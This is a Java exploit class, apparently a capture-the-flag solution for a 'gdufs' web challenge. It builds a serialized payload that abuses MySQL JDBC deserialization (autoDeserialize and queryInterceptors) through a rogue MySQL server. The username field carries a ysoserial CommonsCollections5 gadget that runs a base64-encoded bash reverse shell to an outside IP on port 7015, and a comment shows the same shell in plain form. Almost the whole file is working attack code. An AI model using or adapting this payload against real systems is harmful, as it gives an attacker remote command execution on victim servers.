package gdufs.challenge.web;

import gdufs.challenge.web.invocation.InfoInvocationHandler;
import gdufs.challenge.web.model.DatabaseInfo;
import gdufs.challenge.web.model.Info;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.Base64;

public class exp {
    public static void main(String[] args) throws Exception{
        DatabaseInfo databaseInfo = new DatabaseInfo();
        databaseInfo.setHost("vps");
        databaseInfo.setPort("7007");//恶意mysql服务端端口
        ///bin/bash -i >& /dev/tcp/vps/7015 0>&1   反弹shell监听的端口
//        databaseInfo.setUsername("yso_URLDNS_http://hud0xf.ceye.io");
        databaseInfo.setUsername("yso_CommonsCollections5_bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzExNi42Mi4yNDAuMTQ4LzcwMTUgMD4mMQ==}|{base64,-d}|{bash,-i}");
        databaseInfo.setPassword("123&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor");

        //System.out.println(databaseInfo.getUsername());
        Method getUsernameMethod = databaseInfo.getClass().getMethod("getUsername");
        String a =(String) getUsernameMethod.invoke(databaseInfo);
        //System.out.println(a);
//        Class c = Class.forName("gdufs.challenge.web.invocation.InfoInvocationHandler");
        //创建一个InfoInvocationHandler类对象
        InfoInvocationHandler infoInvocationHandler = new InfoInvocationHandler(databaseInfo);
        //然后使用动态代理，我们代理的是databaseInfo，所以就要获取其类加载器和接口
        Info info =(Info) Proxy.newProxyInstance(databaseInfo.getClass().getClassLoader(), databaseInfo.getClass().getInterfaces(), infoInvocationHandler);
        //序列化部分，参考MainController.java
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(info);
        oos.close();
        //将序列化结果输出
        //这里的输出语句要注意不要使用System.out.println();
        System.out.printf(new String(Base64.getEncoder().encode(baos.toByteArray())));

    }

}

